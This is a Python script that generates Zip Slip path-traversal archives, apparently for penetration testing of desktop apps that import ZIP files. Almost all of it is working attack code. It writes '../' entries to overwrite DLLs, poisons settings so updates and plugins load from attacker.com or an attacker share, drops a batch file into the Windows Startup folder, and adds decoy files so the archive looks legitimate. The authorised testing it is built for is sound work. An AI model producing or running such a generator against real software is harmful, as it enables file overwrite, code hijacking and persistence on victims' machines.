"""
Zip Slip / Zip Path Traversal Payload Generator

Attack Vector:
    When a desktop app imports .zip files and extracts them without sanitizing
    paths, files with "../" in their names can write outside the intended
    extraction directory. This can overwrite config files, DLLs, or executables.

CVE Examples: CVE-2018-1002200 (Zip Slip), CVE-2018-16385

Targets:
    - Any app with "Import from ZIP" / "Import Project" / "Load Archive"
    - File managers, IDEs, CAD software, document managers
    - Applications that extract ZIP/TAR to a temp directory

Usage:
    python -I zip_slip.py --output traversal.zip --target-file evil.dll --depth 5
    python -I zip_slip.py --output traversal.zip --target-file "..\\..\\..\\Windows\\Temp\\poc.txt" --content "RCE PoC"
    python -I zip_slip.py --output import-project.zip --type overwrite-dll

Generates ZIP with path traversal entries like:
    ../../../evil.dll
    ../../../AppData/Roaming/target_app/plugins/evil.dll
"""

import argparse
import zipfile
import os
import io


def create_traversal_zip(output: str, entries: list[tuple[str, bytes]]):
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as zf:
        # Add a legitimate file so the ZIP looks normal
        zf.writestr("README.txt", "Project Documentation\nVersion 1.0\n")
        zf.writestr("config.xml", '<?xml version="1.0"?>\n<config><name>Project</name></config>')

        for path, content in entries:
            zf.writestr(path, content)
            print(f"  [+] Added: {path} ({len(content)} bytes)")

    print(f"\n[+] ZIP created: {output} ({os.path.getsize(output)} bytes)")


def main():
    parser = argparse.ArgumentParser(description="Zip Slip payload generator for VAPT")
    parser.add_argument("--output", "-o", default="traversal.zip",
                        help="Output ZIP filename")
    parser.add_argument("--type", choices=["basic", "overwrite-dll", "config-poison", "startup", "all"],
                        default="all", help="Payload type")
    parser.add_argument("--depth", type=int, default=6,
                        help="Path traversal depth (number of ../ levels)")
    parser.add_argument("--target-file", help="Specific target filename")
    parser.add_argument("--content", default="VAPT PoC - Zip Slip Path Traversal\n",
                        help="Content for PoC files")
    args = parser.parse_args()

    traverse = ("../" * args.depth) if os.name != "nt" else ("..\\" * args.depth)
    entries = []

    print(f"[*] Zip Slip Payload Generator")
    print(f"[*] Traversal depth: {args.depth}")
    print(f"[*] Output: {args.output}\n")

    if args.target_file:
        path = args.target_file if ".." in args.target_file else traverse + args.target_file
        entries.append((path, args.content.encode()))

    if args.type in ("basic", "all"):
        # Basic traversal PoC — write marker files
        entries.extend([
            (traverse + "temp/zip_slip_poc.txt",
             b"Zip Slip PoC - Path Traversal Achieved\nFile written outside extraction directory\n"),
            (traverse + "Windows/Temp/zip_slip_poc.txt",
             b"Zip Slip PoC - Written to Windows\\Temp\n"),
        ])

    if args.type in ("overwrite-dll", "all"):
        # DLL overwrite — place a DLL where the app loads from
        # In real testing, this would be a compiled payload DLL
        dll_stub = b"MZ" + b"\x00" * 100 + b"PE_STUB_POC"
        entries.extend([
            (traverse + "Program Files/TargetApp/VERSION.dll", dll_stub),
            (traverse + "AppData/Local/TargetApp/plugin.dll", dll_stub),
        ])

    if args.type in ("config-poison", "all"):
        # Overwrite config files
        entries.extend([
            (traverse + "AppData/Roaming/TargetApp/settings.json",
             b'{"auto_update_url": "http://attacker.com/update", "debug": true}\n'),
            (traverse + "AppData/Local/TargetApp/config.xml",
             b'<?xml version="1.0"?>\n<config><plugin_path>\\\\attacker\\share</plugin_path></config>\n'),
        ])

    if args.type in ("startup", "all"):
        # Write to startup locations
        entries.extend([
            (traverse + "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/poc.bat",
             b"@echo off\ncalc.exe\nrem Zip Slip PoC - Startup Persistence\n"),
        ])

    if not entries:
        print("[-] No entries to add. Use --type or --target-file")
        return

    create_traversal_zip(args.output, entries)

    print(f"\n[*] Test by importing this ZIP in the target application.")
    print(f"[*] Check if files were written outside the extraction directory.")
    print(f"[*] Verify with: dir /s /b C:\\temp\\zip_slip_poc.txt")


if __name__ == "__main__":
    main()
